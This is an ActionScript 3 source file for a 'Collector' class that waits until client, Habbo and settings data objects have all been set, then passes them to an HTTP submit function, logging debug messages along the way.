package com.zzzz 
{
	import com.zzzz.data.DataClient;
	import com.zzzz.data.DataHabbo;
	import com.zzzz.data.DataSettings;
	
	public class Collector 
	{
		private var _dataClient:DataClient = null;
		private var _dataClientDone:Boolean = false;
		
		private var _dataHabbo:DataHabbo = null;
		private var _dataHabboDone:Boolean = false;
		
		private var _dataSettings:DataSettings;
		private var _dataSettingsDone:Boolean = false;
		
		public function setClient(data:DataClient): void {
			this._dataClient = data;
			this._dataClientDone = true;
			this._check();
		}
		
		public function setHabbo(data:DataHabbo): void {
			this._dataHabbo = data;
			this._dataHabboDone = true;
			this._check();
		}
		
		public function setSettings(data:DataSettings): void {
			this._dataSettings = data;
			this._dataSettingsDone = true;
			this._check();
		}
		
		private function _check(): void {
			if (!this._dataClientDone || !this._dataHabboDone || !this._dataSettingsDone) {
CONFIG::debug
{
				Logging.debug("Not ready yet..");
}
				return;
			}
			
CONFIG::debug
{
			Logging.debug("Ready to submit");
}
			HTTP.submitData(this._dataClient, this._dataHabbo, this._dataSettings);
		}
	}

}